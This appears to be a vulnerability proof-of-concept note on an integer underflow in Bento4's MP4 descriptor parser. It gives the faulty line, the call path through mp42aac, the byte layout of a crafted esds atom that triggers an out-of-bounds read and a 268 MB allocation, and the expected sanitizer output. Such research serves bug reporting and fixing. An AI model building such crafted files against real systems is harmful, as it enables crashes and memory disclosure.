# PoC Notes: AP4_DecoderConfigDescriptor Integer Underflow (OOB Read)

## Vulnerability

**File**: `Bento4/Source/C++/Core/Ap4DecoderConfigDescriptor.cpp`
**Line**: 92
**Function**: `AP4_DecoderConfigDescriptor::AP4_DecoderConfigDescriptor(AP4_ByteStream&, AP4_Size, AP4_Size)`

```cpp
AP4_SubStream* substream = new AP4_SubStream(stream, start+13, payload_size-13);
```

`payload_size` is of type `AP4_Size` (unsigned 32-bit).
When `payload_size < 13`, unsigned subtraction wraps:

```
payload_size = 1  =>  payload_size - 13 = 0xFFFFFFF4 (4294967284)
```

This creates an `AP4_SubStream` whose declared size is ~4 GB, permitting the
descriptor factory to attempt reads far beyond the actual declared descriptor
boundary.

## Trigger Path

```
mp42aac input.mp4
  -> AP4_File (parses moov)
  -> moov -> trak -> mdia -> minf -> stbl -> stsd -> mp4a -> esds
  -> AP4_EsdsAtom::Create()
  -> AP4_DescriptorFactory::CreateDescriptorFromStream()   (ES_Descriptor, tag=0x03)
  -> AP4_EsDescriptor constructor
  -> AP4_DescriptorFactory::CreateDescriptorFromStream()   (DecoderConfig, tag=0x04)
  -> AP4_DecoderConfigDescriptor constructor  *** LINE 92 ***
       payload_size = 1  ->  1 - 13 = 0xFFFFFFF4 UNDERFLOW
```

## Crafted File Structure

The `esds` atom contains an ES_Descriptor whose payload is:

```
ES_ID        : 00 01
stream_prio  : 00
-- DC Descriptor (tag=0x04, declared size=1 byte) --
  tag        : 04
  size       : 01   <-- payload_size=1, triggers underflow!
  payload    : 80   (1 byte)
-- Extra bytes (after DC payload in the stream) --
  tag        : 05   (AP4_DESCRIPTOR_TAG_DECODER_SPECIFIC_INFO)
  size       : FF FF FF 7F   (expandable encoding of 0x0FFFFFFF = 268 MB)
```

The ES child descriptor loop (8-byte SubStream) re-parses the extra bytes
`[0x05, 0xFF, 0xFF, 0xFF, 0x7F]` as a `DecoderSpecificInfoDescriptor` with
`payload_size = 0x0FFFFFFF`. This causes `AP4_DecoderSpecificInfoDescriptor`
to call `m_Info.SetDataSize(0x0FFFFFFF)`, which attempts to allocate 268 MB
on the heap via `new AP4_Byte[0x0FFFFFFF]`.

The underflowed SubStream (size=0xFFFFFFF4) would allow reading 4 GB of data
past the declared descriptor boundary if the container stream is large enough;
in this PoC the container SubStream is only 8 bytes so the seek to offset 15
fails, but the logical OOB is still present: the DC constructor reads 12 bytes
past the 1-byte declared payload.

## Expected ASAN / UBSAN Output

- **Most likely**: The process aborts with `std::bad_alloc` (268 MB allocation
  fails under ASAN memory overhead) and ASAN prints a stack trace.
- **Alternatively**: ASAN detects a heap-buffer-overflow if the large read
  attempt accesses memory adjacent to the allocated block.
- **UBSAN**: May report unsigned integer underflow if compiled with
  `-fsanitize=unsigned-integer-overflow` (binary has UBSAN enabled).

## Reproduction

```bash
bash vuln_001_run.sh
cat vuln_001_result.txt
```
